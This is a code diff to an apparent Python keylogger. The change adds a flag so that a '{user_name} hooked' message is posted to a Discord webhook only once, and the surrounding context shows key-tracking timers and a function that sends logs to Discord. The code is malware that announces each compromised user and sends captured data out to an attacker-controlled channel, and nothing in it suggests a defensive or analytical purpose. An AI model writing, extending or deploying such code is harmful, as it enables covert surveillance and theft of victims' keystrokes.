@@ -31,6 +31,9 @@ desired_keys = {'\\', '[', '`'}
 key_timer = None
 log_timer = None
 
+# Flag to indicate if the start message has been sent
+start_message_sent = False
+
 # Function to reset key tracking variables
 def reset_key_tracking():
     global key_set, key_count, key_timer
@@ -136,15 +139,18 @@ def send_log_to_discord():
 
 # Function to send the start message to Discord
 def send_start_message():
-    start_message = f"{user_name} hooked"
-    data = {
-        "content": start_message
-    }
-    response = requests.post(webhook_url, json=data)
-    if response.status_code == 200:
-        print('Start message sent successfully.')
-    else:
-        print(f'Failed to send start message. Status code: {response.status_code}')
+    global start_message_sent
+    if not start_message_sent:
+        start_message = f"{user_name} hooked"
+        data = {
+            "content": start_message
+        }
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 200:
+            print('Start message sent successfully.')
+            start_message_sent = True
+        else:
+            print(f'Failed to send start message. Status code: {response.status_code}')
 
 # Send the start message
 send_start_message()
